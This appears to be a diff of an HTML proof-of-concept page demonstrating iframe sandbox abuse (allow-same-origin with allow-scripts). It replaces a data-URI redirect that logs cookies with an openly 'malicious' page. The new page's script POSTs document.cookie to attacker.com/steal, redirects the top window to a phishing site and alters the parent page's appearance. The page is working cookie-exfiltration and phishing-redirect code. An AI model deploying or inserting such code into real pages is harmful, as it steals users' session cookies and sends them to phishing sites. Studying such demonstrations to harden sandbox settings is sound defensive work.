@@ -1,15 +1,26 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirect Example</title>
-    <script>
-        // Redirect using document.location
-        document.location = "data:text/html,%3Cscript%3Econsole.log%28document.cookie%29%3Bconsole.log%28document.domain%29%3B%3C%2Fscript%3E";
-    </script>
+  <meta charset="UTF-8">
+  <title>Malicious exampleB.com</title>
 </head>
 <body>
-    <p>If you are not redirected, <a href="https://www.google.com">click here</a>.</p>
+  <h1>Malicious Content from exampleB.com</h1>
+  
+  <script>
+    // Attacker's script that can run on exampleA.com due to allow-same-origin and allow-scripts
+
+    // Steal cookies from exampleA.com (via document.cookie)
+    fetch('https://attacker.com/steal', {
+      method: 'POST',
+      body: document.cookie
+    });
+
+    // Redirect the parent (exampleA.com) to a malicious site
+    window.top.location.href = "https://phishing-site.com";  // Redirects parent page to a malicious URL
+
+    // Example of DOM manipulation (changing content in the parent page)
+    document.body.style.backgroundColor = 'red';  // Alters parent page's appearance
+  </script>
 </body>
 </html>
